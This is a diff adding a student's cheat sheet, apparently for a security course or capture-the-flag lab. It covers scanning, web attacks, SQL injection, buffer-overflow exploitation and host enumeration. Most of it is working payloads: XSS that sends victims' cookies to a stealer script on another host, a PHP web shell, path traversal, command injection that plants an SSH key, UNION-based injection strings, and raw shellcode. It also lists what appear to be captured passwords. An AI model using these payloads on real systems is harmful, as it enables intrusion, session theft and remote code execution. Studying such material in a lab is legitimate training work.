@@ -1,0 +1,379 @@
+CTFd
+10.50.20.64:8000
+
+20 STRE-012-A JRDbncyVfyJd09f 10.50.35.218
+
+/////////////////////////////////////////////////////////////////////////////////
+
+<<<HTML>>>
+
+Opacity
+
+<<< scanning >>>
+
+Linux - for i in {1..254} ;do (ping -c 1 192.168.86.$i | grep "bytes from" &) ;done
+
+Windows ping sweep - for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.86.%i > nul && echo 192.168.86.%i is up
+
+nmap -sV
+nmap -sP
+
+nc -nvzw1 10.50.xx.xx 21-80 2>/dev/null
+
+nmap --script http-enum.nse 10.50.35.60 -p 80
+nmap --script smb-os-discovery.nse 
+nmap --script ftp-anon.nse
+nmap --script=banner.nse
+
+
+nikto -h 10.50.35.60
+
+//////////////////////////////////////////////////////////////////////////////////////
+
+<script> document.location="http://10.50.32.140:3636/Cookie_Stealer1.php? username="+document.cookie;</script>
+
+<script> document.location="http://10.50.32.140:3636/Cookie_Stealer1.php? username="+document.cookie;</script>
+
+../../../../../../../etc/passwd
+
+
+---------------------
+
+<HTML><BODY>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+<?php
+if($_GET['cmd']) {
+system($_GET['cmd']);
+}
+?>
+</pre>
+</BODY></HTML>
+
+---------------------------
+
+<script>alert('XSS')</script>
+
+
+
+----------------------------------
+
+<script> document.location="http://10.50.35.60:3636/Cookie_Stealer1.php? username="+document.cookie;</script>
+
+<script> document.location="http://<yourServerIP:4444/Cookie_Stealer1.php? username="+document.cookie;</script>
+
+-----------------------------------
+
+find user
+
+create .ssh folder in the user's home director (find in /etc/passwd)
+
+create public key >>>>>>>>>>> ; mkdir /var/www/.ssh
+
+upload public key to .ssh folder
+
+; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKXaQhX7N8gI8UC192TlyOXB/ZHMp/qkJv+vx7Nc6d4UOsLRD6PCHkzcAZkiJuBjMmiIOAEMJyXWI1wDmPxEuiNcLCoUtT7LwQlM/A1kZwo0gQCphX1uftIVJ5TAXEjh4woT68oJaoXgXNOeHKEdGrXEWfD1F/xzoYU6nzpjAoVAQJPpRgBUp9E/+F2zJdOPfyI3ZQlJ0AJRKXmyrjo7XZk2gW6J/5bhl7UeL9zFFKZAhgnCho4Dm+ke5+V9DhPNcIgF7uXWcR/ZPedprf/JrZ8C2DC2mRPSYqE1E5u1Q0DA6+L/07p3s+1c5P9ys3Ahb89nEK4+tSMsnXB7+ilrJx student@linux-opstation-fvcz" > /var/www/.ssh/authorized_keys
+
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+<<<< SQL INJECTION >>>>
+
+Databases >>> Tables >>> Columns >>> data
+
+selesct <data> from <database_name.table_name>;
+
+select * from car Union select tireid,name,size, cost from tires;
+
+MAGIC KEY ->->->-> select table_schema, table_name, column_name, from information_schema.column
+
+select @@version;
+
+select database();
+
+select load_file('/etc/passwd');
+
+select name,size,cost from session.Tires where name="Goodyear";
+
+show Tables;
+
+1) Vulnerable Field and Syntax
+2) # of columns and output/forward
+3) Magic Key Command
+4) Query data
+
+
+
+Audi' or 1='1
+Audi' Union select null,null,null,null,null;#
+Audi' Union select 1,2,3,4,5;#
+Audi' Union select table_schema,2,table_name,column_name,5 from information_schema.columns;#
+Audi' Union select name,2,pass,4,5 from user;#
+
+Union select username,password from members;#
+Union Select ID,level,name from permissions;#
+
+
+http://localhost:40910/cases/productsCategory.php?category=10%20%20Union%20select%20table_schema,table_name,column_name%20from%20information_schema.columns;#
+
+load_file("/file/location")
+
+{ 4nGf    U87s2V }
+INMp7SEho3xKNljvknBG,
+
+
+Boss	OOyAosrBlMBeUe4WDRO0
+
+me@me.com\',1);#
+
+
+///////////////////////////////////////////////////////////////////////////
+
+<<<< ASSEMBLY and REVERSE ENGINEERING >>>>
+
+	<<<< REGISTERS >>>>
+
+RAX ->->->-> used for return values in functions
+
+RBX ->->->->
+
+RCX ->->->->
+
+RDX ->->->->
+
+RSI ->->->-> used to pass 2nd argument to functions
+
+RDI ->->->-> used to pass 1st argument to functions
+
+RSP ->->->->
+
+R8 ->->->-> used to pass 5th argument to functions
+
+R9 ->->->-> used to pass 6th argument to functions
+
+RIP ->->->-> The instruction pointer, holds memory address of the next instruction whating to be executed
+
+	<<<< FLAGS >>>>
+	
+0 --- Carry Flag --- cf ->->->-> Set on high-order bit carry or borrow; cleared otherwise
+
+2 --- Parity Flag --- pf
+
+4 --- Auxiliary --- af
+
+6 --- Zero Flag --- Zf ->->->-> if the outcome is zero, the Zero Flag is set to 1 (TRUE)
+
+7 --- Sign Flag --- sf ->->->-> Set to 1 if the number is negative
+
+8 --- Trace Flag
+
+9 --- Interrupt fLAG 
+
+10 --- Direction Flag
+
+11 --- Overflow Flag
+
+	<<<< ASSEMBLY COMMON INSTRUCTIONS >>>> 
+
+MOV ->->->-> move source to destination
+
+PUSH ->->->-> push source onto stack
+
+POP ->->->-> Pop top of stack to destination
+
+INC ->->->-> Increment source by 1
+
+DEC ->->->-> Decrement source by 1
+
+ADD ->->->-> Add source to destination
+
+SUB ->->->-> Subtract source from destination
+
+CMP ->->->-> Compare 2 values by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same.
+
+JMP ->->->-> Jump to specified location
+
+JLE ->->->-> Jump if less than or equal
+
+JE ->->->-> Jump if equal
+
+Syntax
+mov <reg>,<reg>
+mov <reg>,<mem>
+mov <mem>,<reg>
+mov <reg>,<const>
+mov <mem>,<const>
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+<<<< Reverse Engineering>>>>
+
+static analysis
+
+behavioral analysis
+
+dynamic analysis
+
+Diassembly (Debugging)
+
+/////////////////////////////////////////////////////////////////////////////////////
+
+<<<< Exploit Development >>>>
+
+buffer overflow = buffer + buff + eip + nop
+
+1) obtain program/Software
+2) Analysis software
+	a)static
+	b)dynamic
+3)gdb <filename>
+	a)file <filename>
+	b)run with various input
+	c)break main
+	d)disass main
+
+gdb-peda$ run <<< $(python3 /home/student/CCTC-Security/failure.py)
+
+
+(gdb) find /b 0xf7de2000, 0xf7ffe000, 0xff, 0xe4
+
+
+
+unset env LINES
+unset ENV COLUMNS
+
+info proc map
+
+find /b <<First after heap>>, <<last befor stack>>, 0xff, 0xe4
+
+1111111111111111111111111111111111111111111111111111111111111111111111111111111DDDD
+
+::::::::::::::::::::::::::::::::::::::::::::::::::
+
+cat /.secret/.verysecret.pdb
+
+"\xda\xc6\xbd\x70\x1b\x2a\xad\xd9\x74\x24\xf4\x58\x33\xc9" +
+"\xb1\x11\x31\x68\x17\x83\xc0\x04\x03\x18\x08\xc8\x58\xb2" +
+"\x25\x54\x3a\x10\x5c\x0c\x11\xf7\x29\x2b\x01\xd8\x5a\xdc" +
+"\xd2\x4e\xb2\x7e\xba\xe0\x45\x9d\x6e\x14\x48\x62\x8f\xe4" +
+"\x10\x03\xfb\xc4\xf9\xed\x70\x61\x65\x80\x13\x1d\x46\x4a" +
+"\xaa\xb8\xea\xeb\x21\x27\x68\x7e\xa3\xd3\x40\x0e\x4f\x79" +
+"\x9d\xb9\xdc\xf4\x7c\x88\x63"
+
+:::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+
+
+
+0xf7df1b51
+0xf7f6674b
+0xf7f72753
+0xf7f72c6b
+0xf7f72df7
+0xf7f7307b
+0xf7f7322b
+
+
+
+
+sudo ./inventory.exe <<< $(python failure.py)
+
+
+
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+!mona config -sat workingfolder C:\mona\
+
+
+
+
+
+///////////////////////////////////////////////////////////////////////////////
+
+Control sockets
+
+ssh -M -S /tmp/s student@<x.x.x.x>
+
+sudo tail -f /var/log/auth.log
+
+ssh -o ‘ControlPath=/tmp/s’ student@<xx.x.x.x>
+
+scp -o ‘ControlPath=/tmp/s’ source destination
+
+
+/////////////////////////////////////////////////////////////////
+
+<<<<enumeration>>>>
+
+---------Linux-----------
+
+date
+time
+
+sudo -l
+
+w
+who
+whoami
+
+last
+
+cat /etc/passwd
+
+su -> cat /etc/shadow
+
+uptime
+
+hostname
+uname -a
+
+cat /etc/hosts
+
+netstat -auntp
+
+ps -elf --forest
+
+lsof
+
+ls -la
+
+service --status-all
+
+cat /etc/rsyslog.conf  (remote system logging, if port 514 is open, then logs are being sent to a remote host.)
+cat /etc/rsyslog.d/*.conf
+
+crontab -e
+crontab -l
+cd /var/spool/cron
+
+--------------Windows----------------------
+
+hostname
+
+
+C:\Windows\System32\drivers\etc\hosts
+
+net user
+
+net localgroup
+net localgroup administrators
+
+net use (lists shares)
+
+ipconfig /all
+route print
+netstat -ano
+
+dir /a:h (cmd list hidden files)
+
+C:\window\systen32\winevt
+
+tasklist /svc
+sc query
+
+
